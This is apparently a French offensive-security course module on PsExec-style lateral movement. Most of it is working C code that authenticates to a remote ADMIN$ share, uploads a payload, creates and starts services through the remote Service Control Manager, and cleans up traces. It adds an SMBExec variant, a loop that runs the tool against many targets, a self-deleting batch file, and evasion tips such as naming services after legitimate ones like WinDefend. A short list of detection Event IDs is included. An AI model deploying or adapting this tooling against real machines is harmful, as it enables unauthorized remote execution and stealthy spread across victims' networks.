# Module W69 : Technique PsExec

## Objectifs

A la fin de ce module, vous serez capable de :
- Comprendre le fonctionnement interne de PsExec
- Implementer un clone de PsExec en C
- Utiliser la creation de services distants pour l'execution laterale
- Deployer des payloads sur des machines distantes

## 1. Comprendre PsExec

### 1.1 Qu'est-ce que PsExec ?

PsExec est un outil de Sysinternals (Microsoft) permettant d'executer des commandes sur des machines distantes. Imaginez-le comme SSH pour Windows, mais utilisant SMB et le Service Control Manager.

```
MACHINE LOCALE           RESEAU           MACHINE DISTANTE
┌─────────────┐                          ┌─────────────┐
│             │                          │             │
│  PsExec.exe │─────────────────────────>│   SMB       │
│             │   1. Connexion SMB       │   (445)     │
│             │                          │             │
│             │<─────────────────────────┤             │
│             │   2. Authentification    │             │
│             │                          │             │
│             │─────────────────────────>│             │
│             │   3. Upload executable   │  ADMIN$     │
│             │      (\\C$\TEMP\...)     │             │
│             │                          │             │
│             │─────────────────────────>│             │
│             │   4. Creation service    │   SCM       │
│             │                          │             │
│             │<─────────────────────────┤             │
│             │   5. Output redirige     │  Pipe       │
└─────────────┘                          └─────────────┘
```

### 1.2 Les Etapes de PsExec

```
PHASE 1: CONNEXION
├─ Connexion SMB a la cible (port 445)
├─ Authentification (credentials ou hash)
└─ Acces au partage ADMIN$ (C:\Windows)

PHASE 2: DEPLOIEMENT
├─ Upload de PSEXECSVC.EXE vers ADMIN$
└─ Fichier place dans C:\Windows\

PHASE 3: EXECUTION
├─ Connexion au Service Control Manager (RPC)
├─ Creation d'un nouveau service
├─ Demarrage du service
└─ Le service execute la commande voulue

PHASE 4: COMMUNICATION
├─ Creation de named pipes
├─ Redirection stdin/stdout/stderr
└─ Transmission des resultats

PHASE 5: NETTOYAGE
├─ Arret du service
├─ Suppression du service
└─ Suppression de PSEXECSVC.EXE
```

### 1.3 Schema Detaille

```
┌──────────────────────────────────────────────────────────┐
│                    MACHINE DISTANTE                      │
│                                                          │
│  C:\Windows\PSEXECSVC.EXE  (Service temporaire)          │
│       │                                                  │
│       ├─> Lance cmd.exe ou payload                       │
│       │                                                  │
│       └─> Connecte les I/O aux named pipes:              │
│            \\.\pipe\PSEXECSVC-stdin                      │
│            \\.\pipe\PSEXECSVC-stdout                     │
│            \\.\pipe\PSEXECSVC-stderr                     │
│                                                          │
└──────────────────────────────────────────────────────────┘
           ▲                              │
           │                              │
       (Upload)                       (Output)
           │                              │
           │                              ▼
┌──────────────────────────────────────────────────────────┐
│                    MACHINE LOCALE                        │
│                                                          │
│  PsExec.exe                                              │
│    ├─> Upload via SMB                                    │
│    ├─> Cree le service via SCM                           │
│    └─> Lit les pipes pour recevoir l'output              │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

## 2. Implementation en C

### 2.1 Connexion SMB et Upload

```c
#include <windows.h>
#include <stdio.h>

// Fonction pour se connecter au partage ADMIN$
BOOL ConnectToRemoteShare(const char* target, const char* username, const char* password) {
    NETRESOURCEA nr;
    DWORD result;
    char remotePath[256];

    snprintf(remotePath, sizeof(remotePath), "\\\\%s\\ADMIN$", target);

    printf("[*] Connexion a %s\n", remotePath);

    ZeroMemory(&nr, sizeof(nr));
    nr.dwType = RESOURCETYPE_DISK;
    nr.lpRemoteName = remotePath;

    // Se connecter avec credentials
    result = WNetAddConnection2A(&nr, password, username, 0);

    if (result == NO_ERROR) {
        printf("[+] Connexion reussie a %s\n", remotePath);
        return TRUE;
    } else if (result == ERROR_SESSION_CREDENTIAL_CONFLICT) {
        printf("[*] Session deja existante\n");
        return TRUE;
    } else {
        printf("[!] Echec connexion: %d\n", result);
        return FALSE;
    }
}

// Upload d'un fichier vers le partage distant
BOOL UploadFile(const char* target, const char* localFile, const char* remoteFile) {
    char remotePath[512];
    BOOL success;

    snprintf(remotePath, sizeof(remotePath), "\\\\%s\\ADMIN$\\%s", target, remoteFile);

    printf("[*] Upload: %s -> %s\n", localFile, remotePath);

    success = CopyFileA(localFile, remotePath, FALSE);

    if (success) {
        printf("[+] Upload reussi\n");
    } else {
        printf("[!] Upload echoue: %d\n", GetLastError());
    }

    return success;
}
```

### 2.2 Creation et Gestion de Service

```c
#include <windows.h>
#include <stdio.h>

// Se connecter au Service Control Manager distant
SC_HANDLE ConnectToRemoteSCM(const char* target) {
    SC_HANDLE hSCM;

    printf("[*] Connexion au SCM de %s\n", target);

    hSCM = OpenSCManagerA(
        target,
        NULL,
        SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT
    );

    if (hSCM == NULL) {
        printf("[!] OpenSCManager echoue: %d\n", GetLastError());
        return NULL;
    }

    printf("[+] Connecte au SCM\n");
    return hSCM;
}

// Creer un service distant
SC_HANDLE CreateRemoteService(
    SC_HANDLE hSCM,
    const char* serviceName,
    const char* displayName,
    const char* binaryPath
) {
    SC_HANDLE hService;

    printf("[*] Creation du service: %s\n", serviceName);

    hService = CreateServiceA(
        hSCM,
        serviceName,
        displayName,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        binaryPath,
        NULL,
        NULL,
        NULL,
        NULL,  // LocalSystem account
        NULL
    );

    if (hService == NULL) {
        DWORD error = GetLastError();
        if (error == ERROR_SERVICE_EXISTS) {
            printf("[*] Service existe deja, ouverture...\n");
            hService = OpenServiceA(hSCM, serviceName, SERVICE_ALL_ACCESS);
        } else {
            printf("[!] CreateService echoue: %d\n", error);
            return NULL;
        }
    }

    if (hService) {
        printf("[+] Service cree/ouvert\n");
    }

    return hService;
}

// Demarrer le service
BOOL StartRemoteService(SC_HANDLE hService) {
    SERVICE_STATUS status;

    printf("[*] Demarrage du service...\n");

    if (!StartServiceA(hService, 0, NULL)) {
        DWORD error = GetLastError();
        if (error == ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[*] Service deja en cours d'execution\n");
            return TRUE;
        } else {
            printf("[!] StartService echoue: %d\n", error);
            return FALSE;
        }
    }

    // Attendre que le service demarre
    Sleep(2000);

    if (QueryServiceStatus(hService, &status)) {
        if (status.dwCurrentState == SERVICE_RUNNING) {
            printf("[+] Service demarre\n");
            return TRUE;
        }
    }

    printf("[!] Le service n'a pas demarre correctement\n");
    return FALSE;
}

// Arreter et supprimer le service
BOOL CleanupService(SC_HANDLE hService, const char* serviceName) {
    SERVICE_STATUS status;

    printf("[*] Nettoyage du service...\n");

    // Arreter le service
    ControlService(hService, SERVICE_CONTROL_STOP, &status);
    Sleep(1000);

    // Supprimer le service
    if (DeleteService(hService)) {
        printf("[+] Service supprime\n");
    } else {
        printf("[!] DeleteService echoue: %d\n", GetLastError());
    }

    CloseServiceHandle(hService);
    return TRUE;
}
```

### 2.3 Clone PsExec Complet

```c
#include <windows.h>
#include <stdio.h>
#include <time.h>

#define SERVICE_NAME "RemoteExec"
#define SERVICE_BINARY "svchost.exe"  // Nom discret

typedef struct _PSEXEC_CONFIG {
    char target[256];
    char username[256];
    char password[256];
    char command[1024];
    char localBinary[512];
} PSEXEC_CONFIG;

// Generer un nom de service aleatoire
void GenerateRandomServiceName(char* buffer, size_t size) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyz";
    srand((unsigned int)time(NULL));

    for (size_t i = 0; i < size - 1; i++) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buffer[size - 1] = '\0';
}

// Fonction principale PsExec
BOOL ExecutePsExec(PSEXEC_CONFIG* config) {
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;
    BOOL success = FALSE;
    char serviceName[32];
    char remoteBinary[256];
    char binaryPath[512];

    printf("\n=== PsExec Implementation ===\n");
    printf("[*] Target: %s\n", config->target);
    printf("[*] Command: %s\n", config->command);

    // Generer un nom de service aleatoire
    GenerateRandomServiceName(serviceName, sizeof(serviceName));
    snprintf(remoteBinary, sizeof(remoteBinary), "%s.exe", serviceName);
    snprintf(binaryPath, sizeof(binaryPath), "%%SystemRoot%%\\%s", remoteBinary);

    // Etape 1: Connexion au partage distant
    if (!ConnectToRemoteShare(config->target, config->username, config->password)) {
        goto cleanup;
    }

    // Etape 2: Upload du binaire
    if (!UploadFile(config->target, config->localBinary, remoteBinary)) {
        goto cleanup;
    }

    // Etape 3: Connexion au SCM
    hSCM = ConnectToRemoteSCM(config->target);
    if (!hSCM) {
        goto cleanup;
    }

    // Etape 4: Creation du service
    // Le binaire execute la commande passee en parametre
    char fullCommand[1024];
    snprintf(fullCommand, sizeof(fullCommand), "%s %s", binaryPath, config->command);

    hService = CreateRemoteService(
        hSCM,
        serviceName,
        "Remote Execution Service",
        fullCommand
    );

    if (!hService) {
        goto cleanup;
    }

    // Etape 5: Demarrage du service
    if (!StartRemoteService(hService)) {
        goto cleanup;
    }

    printf("[+] Commande executee avec succes!\n");
    printf("[*] Attente de l'execution...\n");
    Sleep(5000);  // Attendre l'execution

    success = TRUE;

cleanup:
    // Nettoyage
    if (hService) {
        CleanupService(hService, serviceName);
    }
    if (hSCM) {
        CloseServiceHandle(hSCM);
    }

    // Supprimer le fichier upload
    char remoteFilePath[512];
    snprintf(remoteFilePath, sizeof(remoteFilePath),
             "\\\\%s\\ADMIN$\\%s", config->target, remoteBinary);
    DeleteFileA(remoteFilePath);

    // Deconnexion du partage
    char remotePath[256];
    snprintf(remotePath, sizeof(remotePath), "\\\\%s\\ADMIN$", config->target);
    WNetCancelConnection2A(remotePath, 0, TRUE);

    return success;
}

int main(int argc, char* argv[]) {
    PSEXEC_CONFIG config;

    if (argc < 5) {
        printf("Usage: %s <target> <username> <password> <command>\n", argv[0]);
        printf("Example: %s 192.168.1.10 Administrator P@ssw0rd \"cmd.exe /c whoami\"\n", argv[0]);
        return 1;
    }

    // Configuration
    strncpy(config.target, argv[1], sizeof(config.target) - 1);
    strncpy(config.username, argv[2], sizeof(config.username) - 1);
    strncpy(config.password, argv[3], sizeof(config.password) - 1);
    strncpy(config.command, argv[4], sizeof(config.command) - 1);
    strncpy(config.localBinary, "payload.exe", sizeof(config.localBinary) - 1);

    // Execution
    if (ExecutePsExec(&config)) {
        printf("\n[+] PsExec termine avec succes\n");
        return 0;
    } else {
        printf("\n[!] PsExec a echoue\n");
        return 1;
    }
}
```

## 3. Named Pipes pour I/O

### 3.1 Creation de Pipes

```c
#include <windows.h>
#include <stdio.h>

// Creer un named pipe pour la communication
HANDLE CreateNamedPipeForIO(const char* pipeName) {
    HANDLE hPipe;
    char fullPipeName[256];

    snprintf(fullPipeName, sizeof(fullPipeName), "\\\\.\\pipe\\%s", pipeName);

    printf("[*] Creation du pipe: %s\n", fullPipeName);

    hPipe = CreateNamedPipeA(
        fullPipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1,  // Max instances
        4096,  // Output buffer
        4096,  // Input buffer
        0,
        NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[!] CreateNamedPipe echoue: %d\n", GetLastError());
        return NULL;
    }

    printf("[+] Pipe cree\n");
    return hPipe;
}

// Thread pour lire l'output du pipe
DWORD WINAPI ReadPipeThread(LPVOID lpParam) {
    HANDLE hPipe = (HANDLE)lpParam;
    char buffer[4096];
    DWORD bytesRead;

    printf("[*] Thread de lecture du pipe demarre\n");

    while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
        if (bytesRead > 0) {
            buffer[bytesRead] = '\0';
            printf("%s", buffer);
        }
    }

    printf("[*] Thread de lecture termine\n");
    return 0;
}
```

## 4. Techniques Avancees

### 4.1 PsExec avec Pass-the-Hash

```c
// Combiner PsExec avec PTH
BOOL PsExecWithHash(const char* target, const char* username, const char* ntlmHash, const char* command) {
    // 1. Injecter le hash dans LSASS (voir module W67)
    // 2. Utiliser PsExec normalement
    // 3. La connexion SMB utilisera le hash injecte

    printf("[*] PsExec avec Pass-the-Hash\n");
    printf("[*] Hash: %s\n", ntlmHash);

    // Implementation simplified
    // Voir module W67 pour l'injection de hash

    return TRUE;
}
```

### 4.2 Execution Furtive

```c
// Service binaire qui se supprime apres execution
void SelfDeletingService(const char* command) {
    char batFile[256];
    char cmdLine[512];

    // Creer un fichier .bat qui:
    // 1. Attend que le service se termine
    // 2. Supprime l'executable
    // 3. Se supprime lui-meme

    GetTempFileNameA(".", "tmp", 0, batFile);

    FILE* f = fopen(batFile, "w");
    if (f) {
        fprintf(f, "@echo off\n");
        fprintf(f, ":loop\n");
        fprintf(f, "tasklist | find /i \"%%~n0\" >nul\n");
        fprintf(f, "if not errorlevel 1 (\n");
        fprintf(f, "  timeout /t 1 /nobreak >nul\n");
        fprintf(f, "  goto loop\n");
        fprintf(f, ")\n");
        fprintf(f, "del /f /q \"%%~f0\"\n");
        fclose(f);

        // Executer le .bat en arriere-plan
        snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c start /b %s", batFile);
        system(cmdLine);
    }

    // Executer la commande reelle
    system(command);
}
```

## 5. Applications Offensives

### 5.1 Scenario Red Team

```
OBJECTIF: Mouvement lateral sur le reseau

PHASE 1: RECONNAISSANCE
├─ Scanner le reseau pour les machines actives
├─ Identifier les machines avec SMB ouvert (445)
└─ Tester les credentials obtenus

PHASE 2: EXECUTION
├─ Pour chaque machine accessible:
│  ├─ Tester PsExec avec les credentials
│  ├─ Deployer un beacon/agent
│  └─ Etablir la persistance
└─ Pivoter vers d'autres segments

PHASE 3: POST-EXPLOITATION
├─ Enumeration locale
├─ Extraction de credentials
└─ Continuer le mouvement lateral
```

### 5.2 Outil Automatise

```c
// Scanner et executer PsExec sur plusieurs cibles
BOOL MassPsExec(const char** targets, int targetCount, PSEXEC_CONFIG* config) {
    int successCount = 0;

    printf("[*] Execution PsExec sur %d cibles\n", targetCount);

    for (int i = 0; i < targetCount; i++) {
        printf("\n[*] Cible %d/%d: %s\n", i + 1, targetCount, targets[i]);

        strncpy(config->target, targets[i], sizeof(config->target) - 1);

        if (ExecutePsExec(config)) {
            successCount++;
            printf("[+] Succes sur %s\n", targets[i]);
        } else {
            printf("[!] Echec sur %s\n", targets[i]);
        }

        // Delai entre les tentatives (OPSEC)
        Sleep(5000);
    }

    printf("\n[*] Resultats: %d/%d reussis\n", successCount, targetCount);
    return (successCount > 0);
}
```

### 5.3 Detection et Evasion

**Indicateurs de Detection:**
```
- Event ID 7045 (Service Installation)
- Event ID 4697 (Service Install)
- Acces au partage ADMIN$
- Executables dans C:\Windows\ non signes
- Services avec noms aleatoires
- Connexions SMB multiples
```

**Techniques d'Evasion:**
```c
// 1. Utiliser des noms de services legitimes
const char* legitimateNames[] = {
    "WinDefend",
    "wuauserv",
    "BITS",
    "Spooler"
};

// 2. Signer le binaire (si possible)
// 3. Utiliser des binaries Windows natifs (LOLBins)
const char* lolbins[] = {
    "cmd.exe",
    "powershell.exe",
    "wmic.exe",
    "mshta.exe"
};

// 4. Delai aleatoire entre operations
void RandomDelay() {
    int delay = (rand() % 10 + 5) * 1000;  // 5-15 secondes
    Sleep(delay);
}

// 5. Nettoyer immediatement
void QuickCleanup(const char* target, const char* serviceName, const char* filename) {
    // Arreter le service immediatement
    // Supprimer le service
    // Supprimer le fichier
    // Deconnecter le partage
}
```

## 6. Alternatives a PsExec

### 6.1 SMBExec

```
DIFFERENCE PRINCIPALE:
- PsExec: Upload un binaire + cree un service
- SMBExec: Execute directement via service (pas de fichier)

AVANTAGE:
- Moins de traces sur le disque
- Plus furtif

IMPLEMENTATION:
- Utiliser un service avec une commande directe
- Pas besoin d'uploader de fichier
```

```c
BOOL SMBExec(const char* target, const char* username, const char* password, const char* command) {
    SC_HANDLE hSCM, hService;
    char serviceName[32];

    // Connexion au SCM
    hSCM = ConnectToRemoteSCM(target);
    if (!hSCM) return FALSE;

    // Generer nom de service
    GenerateRandomServiceName(serviceName, sizeof(serviceName));

    // Creer service avec commande directe (pas de binaire)
    char cmdLine[1024];
    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c %s", command);

    hService = CreateRemoteService(
        hSCM,
        serviceName,
        "Temp Service",
        cmdLine
    );

    if (!hService) {
        CloseServiceHandle(hSCM);
        return FALSE;
    }

    // Demarrer et nettoyer
    StartRemoteService(hService);
    Sleep(2000);
    CleanupService(hService, serviceName);
    CloseServiceHandle(hSCM);

    return TRUE;
}
```

### 6.2 WMI Execution

```
Alternative via WMI (voir module W68)
- Plus furtif
- Pas de service cree
- Utilise WMI pour l'execution
```

## 7. Checklist PsExec

```
[ ] Comprendre le protocole SMB et les partages ADMIN$
[ ] Savoir se connecter a un SCM distant
[ ] Creer et gerer des services distants
[ ] Uploader des fichiers via SMB
[ ] Implementer la redirection I/O avec named pipes
[ ] Gerer le nettoyage des traces
[ ] Combiner avec Pass-the-Hash
[ ] Connaitre les alternatives (SMBExec, WMI)
[ ] Implementer des techniques d'evasion
[ ] Comprendre la detection (Event IDs)
```

## 8. Exercices

Voir [exercice.md](exercice.md)

## Ressources Complementaires

- MITRE ATT&CK: T1021.002 (Remote Services: SMB/Windows Admin Shares)
- MITRE ATT&CK: T1569.002 (System Services: Service Execution)
- Microsoft Sysinternals: PsExec Documentation
- Impacket: psexec.py source code

---

**Navigation**
- [Module precedent](../W68_wmi_lateral/)
- [Module suivant](../W70_dcom_lateral/)
